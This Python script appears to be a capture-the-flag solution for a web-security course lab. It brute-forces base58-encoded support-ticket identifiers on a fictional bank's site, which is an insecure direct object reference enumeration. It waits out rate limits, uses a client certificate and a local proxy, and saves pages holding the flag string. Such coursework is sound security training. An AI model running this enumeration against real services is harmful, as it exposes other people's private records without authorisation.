from requests_pkcs12 import get, post
import json
import pprint
from requests import Session
from requests_pkcs12 import Pkcs12Adapter
import threading, sys, os
import requests
import time
import urllib.parse
import base58

#this is the new pw for the new cert
pw = ''

url = 'https://support.quoccabank.com/raw/'

headers = {
    'Content-Type' : 'application/x-www-form-urlencoded',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Origin' : 'https://haas.quoccabank.com',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
}


def make_url(x:int, y:int) -> str:
    un = f"{x}:{y}"
    encoded = base58.b58encode(un)
    with open('sup_log.txt', 'a') as f:
        f.writelines(f"trying {un}\n")
    end = str(encoded)[2:-1]
    full_url = url + str(end)
    return full_url
def main():
    
    requests.packages.urllib3.disable_warnings() 
    #r = post(url=url,headers = headers, data=data, pkcs12_filename='new.p12', pkcs_12_password=pw)
    try:
        with Session() as s:
            #270:3029 spammy
            #333 17 fake flag
            #357 37 fake flag
            #436 1553 spammy
            #709 1284 spammy
            #729 18 fake
            #887 324 fake
            #903 3503 spammy
            #915 57 fake
            #1125 4 fake
            #1238 6 fake
            x = 5555
            y = 1
            s.mount(url,Pkcs12Adapter(pkcs12_filename='new.p12', pkcs12_password=pw))
            s.proxies = {'https' : '127.0.0.1:8080'}
            
            
            while True:
                full_url = make_url(x,y)
                status_code = 429
                while status_code == 429:
                    r = s.get(full_url, verify=False)
                    status_code = r.status_code
                    if status_code == 429:
                        headers = r.headers
                        no_ms = headers['X-Retry-In'][0:-2]
                        sec = float(no_ms)
                        #print(f"Retrying url {full_url} in {sec / 1000} seconds")
                        time.sleep(sec / 1000)
                if 'COMP6443' in r.text:
                    print(r.text)   
                    with open('supp.txt', 'a') as f:
                        f.writelines(r.text)
                    #break
                if status_code == 404:
                    if y == 1:
                        x += 1
                    else:
                        x += 1
                        y = 1
                else:
                    y += 1   
                        
                        
            
            # for i in range(100):
            #     status_code = -1
            #     url1 = url + '?cat=' + str(i)
            #     while status_code != 200:
            #         r = s.get(url1, verify=False)
            #         status_code = r.status_code
            #         if status_code == 404:
            #             break
            #         if status_code == 429:
            #             headers = r.headers
            #             sec = float(headers['X-Retry-In:'])
            #             print(f"Retrying url {url1} in {sec / 1000} seconds")
            #             time.sleep(sec)
            #     if 'COMP6443' in r.text:
            #         print(r.text)    
              
    except KeyboardInterrupt:
        print("Force exiting")
        os._exit(1)


    

    
if __name__ == '__main__':
    
    main()